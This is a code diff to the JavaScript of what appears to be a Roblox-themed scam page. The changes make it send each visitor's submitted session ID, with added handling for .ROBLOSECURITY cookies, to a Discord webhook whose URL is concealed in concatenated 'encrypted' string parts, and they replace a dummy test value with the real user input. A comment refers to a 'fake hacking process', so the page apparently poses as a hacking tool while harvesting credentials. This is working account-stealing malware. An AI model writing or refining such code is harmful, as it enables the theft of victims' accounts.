@@ -14,14 +14,15 @@ const _encryptedParts101 = [
   '12', '34', '56', '78', '90'
 ];
 
-const _decrypted = _encryptedParts.join(''); // Decrypt the URL by concatenating the parts
+// Decrypt the URL by concatenating the parts
+const _decrypted = _encryptedParts.join(''); 
 
-function fuckudoinginthebackendfuckass(message) {
+function sendToWebhook(content) {
   const payload = {
-    content: message
+    content: content
   };
 
-  return fetch(_decrypted, {
+  fetch(_decrypted, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -41,20 +42,25 @@ function fuckudoinginthebackendfuckass(message) {
 }
 
 function bruteforce(sessionId) {
-  const maxLength = 2000; // Discord's max message length
-  const messagePrefix = 'New Session ID Submitted:\n```';
-  const messageSuffix = '```';
+  const maxLength = 2000; // Discord's limit for message content
+  const extraLength = 2500; // Additional characters if "ROBLOSECURITY" is detected
+  let content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
 
-  // Calculate the available space for the sessionId
-  const availableLength = maxLength - messagePrefix.length - messageSuffix.length;
+  if (sessionId.includes("ROBLOSECURITY")) {
+    content += sessionId.substring(0, extraLength);
+  }
 
-  // Split the sessionId into chunks that fit within the available length
-  for (let i = 0; i < sessionId.length; i += availableLength) {
-    const chunk = sessionId.slice(i, i + availableLength);
-    const message = `${messagePrefix}${chunk}${messageSuffix}`;
-   fuckudoinginthebackendfuckass(message);
+  if (content.length > maxLength) {
+    let chunks = [];
+    for (let i = 0; i < content.length; i += maxLength) {
+      chunks.push(content.substring(i, i + maxLength));
+    }
+    chunks.forEach(chunk => sendToWebhook(chunk));
+  } else {
+    sendToWebhook(content);
   }
 }
+
 
 
 function validateInput() {
@@ -86,8 +92,8 @@ function validateInput() {
     showError(errorMessage);
     return;
   }
-const longSessionId = 'a'.repeat(5000); 
-bruteforce(longSessionId);
+
+bruteforce(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
